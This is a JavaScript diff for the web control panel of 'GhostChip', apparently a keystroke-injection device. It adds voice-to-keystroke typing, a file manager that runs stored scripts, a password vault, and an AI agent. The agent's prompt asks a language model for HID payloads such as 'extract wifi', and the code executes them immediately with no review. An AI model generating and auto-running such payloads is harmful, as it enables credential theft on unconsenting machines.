+        if (res.isFinal) {
+          finalChunk += res[0].transcript;
+        } else {
+          interim += res[0].transcript;
+        }
+      }
+
+      finalChunk = finalChunk.trim();
+      interim = interim.trim();
+
+      // When a speech segment is finalized
+      if (finalChunk && !event._handledFinal) {
+        event._handledFinal = true;
+
+        if (mode === 'stream') {
+          kbProcessSpokenSentence(finalChunk, autoEnter);
+        }
+
+        // Add to buffer with single space separation
+        if (kbSpeechBuffer) {
+          kbSpeechBuffer += ' ' + finalChunk;
+        } else {
+          kbSpeechBuffer = finalChunk;
+        }
+      }
+
+      // Update UI live text
+      const liveBox = $('kbVoiceLiveText');
+      if (liveBox) {
+        const base = kbSpeechBuffer;
+        liveBox.innerHTML = escHtml(base) + (interim ? (base ? ' ' : '') + `<span class="interim">${escHtml(interim)}</span>` : '');
+      }
+
+      const bufferActions = $('kbVoiceBufferActions');
+      if (bufferActions) {
+        bufferActions.style.display = (mode === 'buffer' && kbSpeechBuffer) ? 'flex' : 'none';
+      }
+    };
+
+    kbRecognition.onerror = (event) => {
+      if (event.error === 'not-allowed') {
+        kbSpeechActive = false;
+        toast('Microphone access blocked. Please allow mic permissions in browser settings.', 'err');
+        kbResetVoiceUI();
+      } else if (event.error !== 'no-speech') {
+        console.warn('Speech recognition warning:', event.error);
+      }
+    };
+
+    kbRecognition.onend = () => {
+      if (kbSpeechActive) {
+        // Auto-restart next clean utterance after brief interval
+        setTimeout(() => {
+          if (kbSpeechActive && kbRecognition) {
+            try {
+              kbRecognition.lang = $('kbVoiceLang')?.value || 'en-US';
+              kbRecognition.start();
+            } catch (_) {}
+          }
+        }, 80);
+      } else {
+        kbResetVoiceUI();
+      }
+    };
+  }
+  return kbRecognition;
+}
+
+function kbToggleSpeech() {
+  const rec = kbGetSpeechRecognition();
+  if (!rec) {
+    toast('Speech Recognition not supported in this browser. Please use Chrome, Edge, or Safari.', 'err');
+    return;
+  }
+
+  if (kbSpeechActive) {
+    kbStopSpeech();
+  } else {
+    kbStartSpeech();
+  }
+}
+
+function kbStartSpeech() {
+  const rec = kbGetSpeechRecognition();
+  if (!rec) return;
+  rec.lang = $('kbVoiceLang')?.value || 'en-US';
+  kbSpeechActive = true;
+  try {
+    rec.start();
+  } catch (e) {
+    // If already active, ignore
+  }
+}
+
+function kbStopSpeech() {
+  kbSpeechActive = false;
+  if (kbRecognition) {
+    try { kbRecognition.stop(); } catch (_) {}
+  }
+  kbResetVoiceUI();
+}
+
+function kbResetVoiceUI() {
+  const btn = $('kbMicBtn');
+  const label = $('kbMicBtnLabel');
+  const status = $('kbVoiceStatus');
+  if (btn) btn.classList.remove('active');
+  if (label) label.textContent = 'Voice Dictate';
+  if (status) {
+    status.textContent = 'Tap mic to speak';
+    status.classList.remove('listening');
+  }
+}
+
+function kbUpdateVoiceMode() {
+  const mode = $('kbVoiceMode')?.value || 'stream';
+  const bufferActions = $('kbVoiceBufferActions');
+  if (bufferActions) {
+    bufferActions.style.display = (mode === 'buffer' && kbSpeechBuffer) ? 'flex' : 'none';
+  }
+}
+
+function kbUpdateVoiceLang() {
+  if (kbRecognition && kbSpeechActive) {
+    kbRecognition.lang = $('kbVoiceLang')?.value || 'en-US';
+  }
+}
+
+async function kbProcessSpokenSentence(text, autoEnter = false) {
+  if (!text) return;
+
+  // Handle special voice commands
+  const lower = text.toLowerCase().trim();
+  let script = '';
+
+  if (lower === 'enter' || lower === 'new line' || lower === 'newline') {
+    script = 'ENTER';
+  } else if (lower === 'backspace' || lower === 'delete') {
+    script = 'BACKSPACE';
+  } else if (lower === 'tab' || lower === 'next') {
+    script = 'TAB';
+  } else if (lower === 'space') {
+    script = 'SPACE';
+  } else if (lower === 'escape') {
+    script = 'ESC';
+  } else {
+    script = 'STRING ' + text + (autoEnter ? '\nENTER' : '');
+  }
+
+  $('kbStatus').textContent = 'Voice Sent: ' + text;
+  try {
+    await deviceFetch('/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'duckyscript=' + encodeURIComponent(script)
+    });
+  } catch (e) {
+    console.error('Speech send error:', e);
+  }
+}
+
+async function kbSendBufferedSpeech(withEnter = false) {
+  if (!kbSpeechBuffer) {
+    toast('No speech recorded yet', 'warn');
+    return;
+  }
+  const script = 'STRING ' + kbSpeechBuffer + (withEnter ? '\nENTER' : '');
+  toast('Typing spoken text via HID…', 'warn', 2000);
+  try {
+    await deviceFetch('/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'duckyscript=' + encodeURIComponent(script)
+    });
+    toast('Spoken text typed successfully ✓');
+    kbClearSpeechBuffer();
+  } catch (e) {
+    toast('Error sending keystrokes: ' + e.message, 'err');
+  }
+}
+
+function kbClearSpeechBuffer() {
+  kbSpeechBuffer = '';
+  const liveBox = $('kbVoiceLiveText');
+  if (liveBox) liveBox.innerHTML = '';
+  const bufferActions = $('kbVoiceBufferActions');
+  if (bufferActions) bufferActions.style.display = 'none';
+}
+
+
+
+// ═══════════════════════════════════════════════════
+//  FILE MANAGER
+// ═══════════════════════════════════════════════════
+
+var fmCurrentPath = '/';
+var fmSelectedFile = null;
+var fmRunBusy = false;
+
+function fmBase() {
+  const b = BASE();
+  if (b === '') return location.origin;
+  return b || 'http://192.168.4.1';
+}
+
+async function fmFetch(path) {
+  const url = getProxyUrl(fmBase() + path);
+  try {
+    return await fetch(url, {
+      headers: { 'Accept': '*/*', 'Referer': fmBase() + '/file-manager' }
+    });
+  } catch (e) {
+    return new Promise((resolve, reject) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('GET', url, true);
+      xhr.setRequestHeader('Accept', '*/*');
+      xhr.onload = () => resolve({ ok: xhr.status < 400, status: xhr.status, text: async () => xhr.responseText, json: async () => JSON.parse(xhr.responseText) });
+      xhr.onerror = () => reject(new Error('Network error'));
+      xhr.timeout = 8000; xhr.ontimeout = () => reject(new Error('Timeout'));
+      xhr.send();
+    });
+  }
+}
+
+async function fmFetchPost(path) {
+  const url = fmBase() + path;
+  const crossOrigin = new URL(url).origin !== location.origin;
+  const opts = crossOrigin
+    ? { method: 'POST', mode: 'no-cors', body: null }
+    : { method: 'POST', headers: { 'Accept': '*/*' }, body: null };
+  return fetch(url, opts);
+}
+
+async function fmNavigate(path) {
+  fmCurrentPath = path;
+  fmSelectedFile = null;
+  fmRenderBreadcrumb(path);
+  await fmLoadList(path);
+}
+
+function fmRefresh() { fmNavigate(fmCurrentPath); }
+
+function fmUp() {
+  if (fmCurrentPath === '/') return;
+  const parent = fmCurrentPath.split('/').filter(Boolean).slice(0, -1).join('/');
+  fmNavigate(parent ? '/' + parent : '/');
+}
+
+function fmRenderBreadcrumb(path) {
+  const parts = path.split('/').filter(p => p);
+  let crumbs = [{ label: '⌂ root', path: '/' }];
+  let built = '';
+  parts.forEach(p => { built += '/' + p; crumbs.push({ label: p, path: built }); });
+  const bc = $('fmBreadcrumb');
+  if (!bc) return;
+  bc.innerHTML = crumbs.map((c, i) =>
+    '<span class="fm-crumb' + (i === crumbs.length - 1 ? ' active' : '') + '" onclick="fmNavigate(\'' + c.path.replace(/'/g, "\\'") + '\')">' + escHtml(c.label) + '</span>'
+  ).join('<span class="fm-sep">›</span>');
+}
+
+async function fmLoadList(path) {
+  const list = $('fmList');
+  if (!list) return;
+  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div>';
+  try {
+    const r = await fmFetch('/fm/list?path=' + encodeURIComponent(path));
+    const text = await r.text();
+    let data;
+    try { data = JSON.parse(text); } catch { data = []; }
+    const items = Array.isArray(data) ? data : (data.files || data.entries || []);
+    if (!items.length) { list.innerHTML = '<div class="empty-state">Empty folder</div>'; return; }
+    items.sort((a, b) => {
+      const aD = a.dir === true || a.type === 'dir' || a.isDir || a.directory;
+      const bD = b.dir === true || b.type === 'dir' || b.isDir || b.directory;
+      if (aD && !bD) return -1; if (!aD && bD) return 1;
+      return (a.name || '').localeCompare(b.name || '');
+    });
+    list.innerHTML = items.map(item => {
+      const isDir = item.dir === true || item.type === 'dir' || item.isDir || item.directory;
+      const name = item.name || item.filename || '';
+      const size = item.size != null ? fmFormatSize(item.size) : '';
+      const iPath = (path === '/' ? '' : path) + '/' + name;
+      const sp = iPath.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+      const sn = name.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+      const icon = isDir
+        ? '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>'
+        : fmFileIcon(name);
+      return '<div class="fm-item' + (isDir ? ' fm-dir' : '') + '" onclick="' + (isDir ? 'fmNavigate(\'' + sp + '\')' : 'fmSelectFile(\'' + sp + '\',\'' + sn + '\',false,this)') + '">' +
+        '<div class="fm-item-icon">' + icon + '</div>' +
+        '<div class="fm-item-info"><div class="fm-item-name">' + escHtml(name) + '</div>' + (!isDir && size ? '<div class="fm-item-size">' + size + '</div>' : '') + '</div>' +
+        (isDir ? '<span class="fm-arrow">›</span>' : '') + '</div>';
+    }).join('');
+  } catch (e) {
+    list.innerHTML = '<div class="empty-state">Failed to load — check connection<br><small style="opacity:.6">' + escHtml(e.message) + '</small></div>';
+    toast('FM: Load failed', 'err');
+  }
+}
+
+function fmFileIcon(name) {
+  const ext = (name.split('.').pop() || '').toLowerCase();
+  if (['txt', 'ducky', 'ds', 'ps1', 'sh', 'bat', 'py'].includes(ext))
+    return '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>';
+  return '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>';
+}
+
+function fmFormatSize(bytes) {
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+  return (bytes / 1048576).toFixed(1) + ' MB';
+}
+
+function fmSelectFile(path, name, isDir, el) {
+  fmSelectedFile = { path, name, isDir };
+  document.querySelectorAll('.fm-item').forEach(e => e.classList.remove('fm-selected'));
+  document.querySelectorAll('.fm-file-actions').forEach(e => e.remove());
+  if (el) el.classList.add('fm-selected');
+  if (!el) return;
+  const actions = document.createElement('div');
+  actions.className = 'fm-file-actions';
+  const isTxt = name.toLowerCase().endsWith('.txt') || name.toLowerCase().endsWith('.ducky') || name.toLowerCase().endsWith('.ds');
+  actions.innerHTML =
+    (isTxt ? '<button class="fm-inline-btn" onclick="event.stopPropagation(); fmEditSelected()">Edit</button>' : '') +
+    '<button class="fm-inline-btn fm-inline-run" onclick="event.stopPropagation(); fmRunSelected()">Run</button>' +
+    '<button class="fm-inline-btn" onclick="event.stopPropagation(); fmDownloadSelected()">⬇ Save</button>' +
+    '<button class="fm-inline-btn fm-inline-del" style="color:#ff4444; border-color:#ff4444;" onclick="event.stopPropagation(); fmDeleteSelected()">Delete</button>';
+  el.appendChild(actions);
+}
+
+function fmClearSelection() {
+  fmSelectedFile = null;
+  document.querySelectorAll('.fm-item').forEach(e => e.classList.remove('fm-selected'));
+  document.querySelectorAll('.fm-file-actions').forEach(e => e.remove());
+}
+
+async function fmRunSelected() {
+  if (!fmSelectedFile || fmRunBusy) return;
+  fmRunBusy = true;
+  try {
+    if (fmSelectedFile.path.startsWith('/Vault/')) {
+      const r = await fmFetch('/fm/download?path=' + encodeURIComponent(fmSelectedFile.path));
+      const text = await r.text();
+      if (text.startsWith('ENC:')) {
+        const decrypted = decryptVault(text.substring(4));
+        await deviceFetch('/', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'duckyscript=' + encodeURIComponent(decrypted)
+        });
+        toast('Encrypted script running: ' + fmSelectedFile.name + ' ✓');
+        fmClearSelection();
+        fmRunBusy = false;
+        return;
+      }
+    }
+    
+    await fmFetchPost('/fm/run?path=' + encodeURIComponent(fmSelectedFile.path));
+    toast('Script running: ' + fmSelectedFile.name + ' ✓');
+    fmClearSelection();
+  } catch (e) {
+    toast('Run sent. Check device status.', 'warn');
+    fmClearSelection();
+  } finally {
+    fmRunBusy = false;
+  }
+}
+
+async function fmDeleteSelected() {
+  if (!fmSelectedFile) return;
+  const { path, name, isDir } = fmSelectedFile;
+  if (!confirm(`Are you sure you want to delete ${isDir ? 'folder' : 'file'} "${name}"?`)) return;
+  
+  try {
+    await fmFetchPost('/fm/delete?path=' + encodeURIComponent(path));
+    toast('Deleted: ' + name + ' ✓');
+    fmClearSelection();
+    await fmLoadList(fmCurrentPath);
+  } catch (e) {
+    toast('Delete failed: ' + e.message, 'err');
+  }
+}
+
+async function abortScript() {
+  try {
+    await deviceFetch('/abort', { method: 'POST' });
+    toast('Abort signal sent', 'warn');
+  } catch (e) {
+    toast('Failed to abort: ' + e.message, 'err');
+  }
+}
+
+// ─── Edit file from File Manager ───
+var fmEditingPath = null; // tracks currently edited device file path
+
+async function fmEditSelected() {
+  if (!fmSelectedFile) return;
+  const { path, name } = fmSelectedFile;
+  toast('Loading ' + name + '…', 'warn', 3000);
+  try {
+    // Use fmFetch which already handles cross-origin correctly
+    const r = await fmFetch('/fm/download?path=' + encodeURIComponent(path));
+    let text = await r.text();
+    
+    // Auto-decrypt if it's a Vault file
+    if (text.startsWith('ENC:')) {
+      toast('Decrypting secure Vault file...', 'ok');
+      text = decryptVault(text.substring(4));
+    }
+    
+    // Load into editor
+    $('editor').value = text;
+    updateLines();
+    localStorage.setItem('gc_script', text);
+    $('fileName').textContent = name;
+    // Track editing path for quick-save
+    fmEditingPath = path;
+    setEditorEditMode(name, path);
+    // Navigate to editor
+    const scriptNav = document.querySelectorAll('.nav-item')[0];
+    if (scriptNav) goPage('scripts', scriptNav);
+    closeTool('filemanager');
+    toast('Editing ' + name + ' — make changes then SAVE ✓');
+  } catch (e) {
+    toast('Could not load file: ' + e.message, 'err');
+  }
+}
+
+function setEditorEditMode(name, path) {
+  // Show edit mode indicator in toolbar
+  let badge = $('editModeBadge');
+  if (!badge) {
+    badge = document.createElement('div');
+    badge.id = 'editModeBadge';
+    badge.className = 'edit-mode-badge';
+    const toolbar = document.querySelector('.editor-toolbar');
+    if (toolbar) toolbar.appendChild(badge);
+  }
+  badge.innerHTML = '<span class="edit-mode-dot"></span><span class="edit-mode-label">EDIT: ' + escHtml(name) + '</span><button class="edit-mode-clear" onclick="clearEditorEditMode()" title="Exit edit mode">✕</button>';
+  badge.style.display = 'flex';
+}
+
+function clearEditorEditMode() {
+  fmEditingPath = null;
+  const badge = $('editModeBadge');
+  if (badge) badge.style.display = 'none';
+}
+
+async function fmSaveEditBack() {
+  if (!fmEditingPath) { showSaveModal(); return; }
+  let script = $('editor').value;
+  if (!script.trim()) { toast('Editor is empty', 'warn'); return; }
+  
+  // Auto-encrypt if saving to Vault
+  if (fmEditingPath.startsWith('/Vault/')) {
+    script = 'ENC:' + encryptVault(script);
+  }
+  
+  const name = fmEditingPath.split('/').pop();
+  const folder = fmEditingPath.substring(0, fmEditingPath.lastIndexOf('/')) || '/';
+  const btn = $('runBtn'); // disable execute btn while saving
+  toast('Saving back to ' + fmEditingPath + '…', 'warn', 3000);
+  try {
+    const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(folder);
+    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+    const blob = new Blob([script], { type: 'text/plain' });
+    const file = new File([blob], name, { type: 'text/plain' });
+    const fd = new FormData();
+    fd.append('file', file, name);
+    const opts = crossOrigin
+      ? { method: 'POST', mode: 'no-cors', body: fd }
+      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
+    await fetch(uploadUrl, opts);
+    toast('Saved → ' + fmEditingPath + ' ✓');
+    // If the user was trying to star — re-open fav modal with path linked
+    if (window._afterSaveOpenFav) {
+      window._afterSaveOpenFav = false;
+      window._pendingFavDevicePath = fmEditingPath;
+      setTimeout(() => {
+        $('addFavModal').style.display = 'flex';
+        showFavForm(fmEditingPath);
+      }, 400);
+    }
+  } catch (e) {
+    toast('Save sent — verify in File Manager', 'warn', 4000);
+  }
+}
+
+function fmDownloadSelected() {
+  if (!fmSelectedFile) return;
+  const url = fmBase() + '/fm/download?path=' + encodeURIComponent(fmSelectedFile.path);
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  if (isMobile) {
+    const opened = window.open(url, '_blank', 'noopener');
+    if (!opened) location.href = url;
+    toast('Opening download: ' + fmSelectedFile.name + '...');
+    return;
+  }
+  const a = document.createElement('a');
+  a.href = url; a.download = fmSelectedFile.name; a.target = '_blank';
+  document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  toast('Downloading ' + fmSelectedFile.name + '...');
+}
+
+function fmUploadClick() { if ($('fmUploadInput')) $('fmUploadInput').click(); }
+
+async function fmHandleUpload(event) {
+  const files = Array.from(event.target.files);
+  if (!files.length) return;
+  const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(fmCurrentPath);
+  const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+  for (const file of files) {
+    toast('Uploading ' + file.name + '...', 'warn', 4000);
+    try {
+      const fd = new FormData();
+      fd.append('file', file, file.name);
+      const opts = crossOrigin
+        ? { method: 'POST', mode: 'no-cors', body: fd }
+        : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
+      await fetch(uploadUrl, opts);
+      toast('Uploaded ' + file.name + ' ✓');
+    } catch (e) {
+      toast('Upload sent. Refreshing folder...', 'warn', 2500);
+    }
+  }
+  event.target.value = '';
+  await fmLoadList(fmCurrentPath);
+}
+
+setTimeout(() => {
+  const dz = $('fmDropzone');
+  if (!dz) return;
+  dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('drag'); });
+  dz.addEventListener('dragleave', () => dz.classList.remove('drag'));
+  dz.addEventListener('drop', e => {
+    e.preventDefault(); dz.classList.remove('drag');
+    const files = Array.from(e.dataTransfer.files);
+    if (!files.length) return;
+    const dt = new DataTransfer();
+    files.forEach(f => dt.items.add(f));
+    $('fmUploadInput').files = dt.files;
+    fmHandleUpload({ target: $('fmUploadInput') });
+  });
+}, 800);
+
+function fmShowMkdir() { if ($('fmMkdirForm')) { $('fmMkdirForm').style.display = 'block'; setTimeout(() => $('fmMkdirName') && $('fmMkdirName').focus(), 100); } }
+function fmHideMkdir() { if ($('fmMkdirForm')) { $('fmMkdirForm').style.display = 'none'; if ($('fmMkdirName')) $('fmMkdirName').value = ''; } }
+
+async function fmCreateFolder() {
+  const name = $('fmMkdirName') ? $('fmMkdirName').value.trim() : '';
+  if (!name) { toast('Enter a folder name', 'warn'); return; }
+  const folderPath = (fmCurrentPath === '/' ? '' : fmCurrentPath) + '/' + name;
+  try {
+    await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent(folderPath));
+    toast('Folder created: ' + name + ' ✓');
+    fmHideMkdir();
+    await fmLoadList(fmCurrentPath);
+  } catch (e) { toast('Create failed: ' + e.message, 'err'); }
+}
+
+// ═══════════════════════════════════════════════════
+//  AI ASSISTANT AGENT
+// ═══════════════════════════════════════════════════
+var assistRecog = null;
+var assistListening = false;
+var assistOS = 'windows';
+
+function setAssistOS(os, btn) {
+  assistOS = os;
+  btn.parentElement.querySelectorAll('.os-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  toast('Target: ' + os.toUpperCase());
+}
+
+function stopAssistant() {
+  if (window.speechSynthesis) window.speechSynthesis.cancel();
+  if (assistRecog) {
+    assistRecog.onend = null; // Prevent auto-restart
+    assistRecog.stop();
+  }
+  assistListening = false;
+  $('assistMicBtn').classList.remove('listening');
+  $('assistStatus').textContent = 'Tap to speak';
+}
+
+function clearAssistantChat() {
+  const chat = $('assistantChat');
+  if (chat) chat.innerHTML = '<div class="chat-msg bot">Chat cleared. How can I help you next?</div>';
+  if ($('assistScript')) $('assistScript').value = '';
+}
+
+function toggleAssistantVoice() {
+  const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+  if (!SpeechRecognition) {
+    toast('Speech recognition not supported', 'err');
+    return;
+  }
+
+  if (assistListening && assistRecog) {
+    assistRecog.stop();
+    return;
+  }
+
+  assistRecog = new SpeechRecognition();
+  assistRecog.lang = 'en-US';
+  assistRecog.interimResults = false;
+  assistRecog.continuous = false;
+
+  const btn = $('assistMicBtn');
+  const status = $('assistStatus');
+
+  assistRecog.onstart = () => {
+    assistListening = true;
+    btn.classList.add('listening');
+    status.textContent = 'Listening...';
+    if (window.speechSynthesis) window.speechSynthesis.cancel();
+  };
+
+  assistRecog.onresult = (e) => {
+    const text = e.results[0][0].transcript;
+    addChatMsg('user', text);
+    processAssistantRequest(text);
+  };
+
+  assistRecog.onerror = (err) => {
+    assistListening = false;
+    btn.classList.remove('listening');
+    status.textContent = 'Tap to speak';
+    if (err.error !== 'no-speech') toast('Mic error: ' + err.error, 'err');
+  };
+
+  assistRecog.onend = () => {
+    assistListening = false;
+    btn.classList.remove('listening');
+    if (status.textContent === 'Listening...') status.textContent = 'Tap to speak';
+  };
+
+  assistRecog.start();
+}
+
+function addChatMsg(role, text) {
+  const chat = $('assistantChat');
+  if (!chat) return;
+  const msg = document.createElement('div');
+  msg.className = 'chat-msg ' + role;
+  msg.textContent = text;
+  chat.appendChild(msg);
+  chat.scrollTop = chat.scrollHeight;
+}
+
+async function processAssistantRequest(query) {
+  const apiKey = OPENROUTER_KEY || localStorage.getItem('gc_openrouter_key') || '';
+  if (!apiKey) {
+    addChatMsg('bot', 'Please save your OpenRouter API key in Settings → OpenRouter API Key first.');
+    speakAssistant('Please save your OpenRouter API key in Settings first.', false);
+    return;
+  }
+
+  try {
+    const res = await fetch('https://openrouter.ai/api/v1/chat/completions', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + apiKey,
+        'HTTP-Referer': window.location.href,
+        'X-Title': 'GhostChip AI Agent'
+      },
+      body: JSON.stringify({
+        model: AGENT_MODEL,
+        messages: [
+          {
+            role: 'system',
+            content: `You are the GhostChip AI Agent. Target OS: ${assistOS}.
+            1. If the user asks a general question (e.g. "what is python", "who are you"), answer briefly as an expert. Set "script" to null.
+            2. If the user asks for a technical action or HID payload (e.g. "open notepad", "extract wifi"), provide a short text response AND the DuckyScript for ${assistOS}.
+            You MUST respond in JSON: {"text": "verbal reply", "script": "duckyscript or null"}.
+            Use proper DuckyScript syntax: DELAY, STRING, ENTER, GUI, ALT, CTRL, SHIFT, TAB, SPACE, UP, DOWN, LEFT, RIGHT, REM, F1-F12, CAPSLOCK, etc. for windows use GUI for windows key and for mac spotlight use GUI SPACE there is no CMD.
+            *NOTE: ALWAYS add DELAY 2000 after each action line in DuckyScript*,
+            Text replies must be under 100 words.`
+          },
+          { role: 'user', content: query }
+        ],
+        temperature: 0.2,
+        response_format: { type: "json_object" }
+      })
+    });
+
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.error?.message || 'API Error');
+
+    const reply = JSON.parse(data.choices[0].message.content);
+
+    addChatMsg('bot', reply.text);
+
+    if (reply.script) {
+      $('assistScript').value = reply.script;
+      toast('Agent executing script...', 'ok');
+      deviceFetch('/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'duckyscript=' + encodeURIComponent(reply.script)
+      });
+      // For scripts, maybe don't auto-listen immediately to avoid loop, but let's try it.
+      speakAssistant(reply.text, true);
+    } else {
+      speakAssistant(reply.text, true);
+    }
+
+    $('assistStatus').textContent = 'Tap to speak';
+  } catch (e) {
+    addChatMsg('bot', 'Error: ' + e.message);
+    speakAssistant('I encountered an error.', true);
+    $('assistStatus').textContent = 'Tap to speak';
+  }
+}
+
+function speakAssistant(text, autoListen = false) {
+  if (!window.speechSynthesis) return;
+  const utterance = new SpeechSynthesisUtterance(text);
+  utterance.rate = 1.0;
+  utterance.pitch = 1.1;
+
+  utterance.onend = () => {
+    // Only auto-listen if we are still in the assistant tool
+    const panel = $('tool-assistant');
+    if (autoListen && panel && panel.style.display !== 'none') {
+      setTimeout(() => {
+        if (!assistListening) toggleAssistantVoice();
+      }, 300);
+    }
+  };
+
+  window.speechSynthesis.speak(utterance);
+}
+
+function copyAssistant() {
+  const s = $('assistScript').value;
+  if (!s) return;
+  navigator.clipboard.writeText(s).then(() => toast('Copied ✓'));
+}
+
+function simulateAssistant() {
+  const s = $('assistScript').value;
+  if (!s) return;
+  $('editor').value = s;
+  simulatePayload();
+}
+
+// ─── Favourites Tool App ───
+var toolFavCurrentFilter = 'all';
+
+function filterToolFavs(tag, btn) {
+  toolFavCurrentFilter = tag;
+  document.querySelectorAll('#toolFavsFilter .fav-filter-btn').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  renderToolFavGrid();
+}
+
+async function renderToolFavGrid() {
+  const grid = $('toolFavGrid');
+  if (!grid) return;
+
+  grid.innerHTML = '<div class="fav-empty"><span class="spin"></span> Loading...</div>';
+
+  const list = await loadFavsFromDeviceDirectories(toolFavCurrentFilter);
+
+  if (!list.length) {
+    grid.innerHTML = '<div class="fav-empty">' +
+      (toolFavCurrentFilter === 'all' ? 'No favourites yet on device.' : 'No ' + toolFavCurrentFilter + ' favourites yet.') +
+      '</div>';
+    return;
+  }
+
+  grid.innerHTML = list.map(fav => {
+    const m = TAG_META[fav.tag] || TAG_META.custom;
+    const fileName = fav.devicePath ? fav.devicePath.split('/').pop() : (fav.name || 'script.txt');
+    const pathHtml = fav.devicePath
+      ? `<div class="fav-device-path" title="${escHtml(fav.devicePath)}"><svg viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg><span class="fav-path-text">${escHtml(fav.devicePath)}</span></div>`
+      : '';
+    const metaText = `Device File`;
+    return `<div class="fav-card ${m.cls} pro-ai-card" id="tool-fav-${fav.id}" style="padding:14px; display:flex; flex-direction:column; gap:10px; background:var(--s2); border:1px solid rgba(255,170,0,0.25); border-radius:12px;">
+      <div class="fav-card-top" style="display:flex; justify-content:space-between; align-items:center;">
+        <span class="fav-tag-badge ${m.cls}" style="display:flex; align-items:center; gap:5px; font-size:0.68rem; font-weight:700;">${m.emoji} <span>${m.label.toUpperCase()}</span></span>
+      </div>
+      <div class="fav-card-name" onclick="runFavDirectly('${fav.id}')" style="cursor:pointer; font-weight:700; font-size:0.95rem; color:var(--white); font-family:var(--mono);">${escHtml(fileName)}</div>
+      <div class="fav-card-meta" style="font-family:var(--mono); font-size:0.7rem; color:var(--dim);">${metaText}</div>
+      ${pathHtml}
+      <div style="display:flex; gap:6px; margin-top:auto;">
+        <button class="btn btn-primary" onclick="event.stopPropagation();runFavDirectly('${fav.id}')" style="flex:1; padding:8px 12px; font-size:0.75rem; background: linear-gradient(135deg, #ffaa00, #ff8800); color:#000; display:flex; align-items:center; justify-content:center; gap:6px;" title="Execute directly from memory card">
+          <svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+          <span>Run Payload</span>
+        </button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ─── Password Vault Tool App ───
+var vaultEntries = [];
+
+async function initVaultApp() {
+  const grid = $('vaultGrid');
+  if (!grid) return;
+  grid.innerHTML = '<div class="fav-empty"><span class="spin"></span> Loading vault...</div>';
+
+  try {
+    try {
+      await fmFetchPost('/fm/mkdir?path=%2FVault');
+    } catch (e) { }
+
+    const r = await fmFetch('/fm/list?path=%2FVault');
+    const text = await r.text();
+    let data;
+    try { data = JSON.parse(text); } catch { data = []; }
+    const items = Array.isArray(data) ? data : (data.files || data.entries || []);
+
+    vaultEntries = [];
+    items.forEach(item => {
+      const isDir = item.dir === true || item.type === 'dir' || item.isDir || item.directory;
+      if (!isDir) {
+        const name = item.name || item.filename || '';
+        if (name.endsWith('.txt')) {
+          vaultEntries.push({
+            name: name.replace(/\.txt$/, ''),
+            path: '/Vault/' + name
+          });
+        }
+      }
+    });
+
+    renderVaultGrid();
+  } catch (e) {
+    grid.innerHTML = '<div class="fav-empty">Failed to load Vault files.</div>';
+  }
+}
+
+function renderVaultGrid() {
+  const grid = $('vaultGrid');
+  if (!grid) return;
+
+  const query = ($('vaultSearch') ? $('vaultSearch').value : '').trim().toLowerCase();
+  const filtered = vaultEntries.filter(e => e.name.toLowerCase().includes(query));
+
+  if (!filtered.length) {
+    grid.innerHTML = '<div class="fav-empty">' + (query ? 'No matching sites found.' : 'Vault is empty. Click + Add to save a password.') + '</div>';
+    return;
+  }
+
+  grid.innerHTML = filtered.map(item => {
+    return `<div class="fav-card tag-custom pro-ai-card" id="vault-card-${item.name}" style="padding:14px; display:flex; flex-direction:column; gap:10px; background:var(--s2); border:1px solid rgba(0,255,65,0.25); border-radius:12px;">
+      <div class="fav-card-top" style="display:flex; justify-content:space-between; align-items:center;">
+        <span class="fav-tag-badge tag-custom" style="display:flex; align-items:center; gap:5px; font-size:0.68rem; font-weight:700; color:var(--g);">
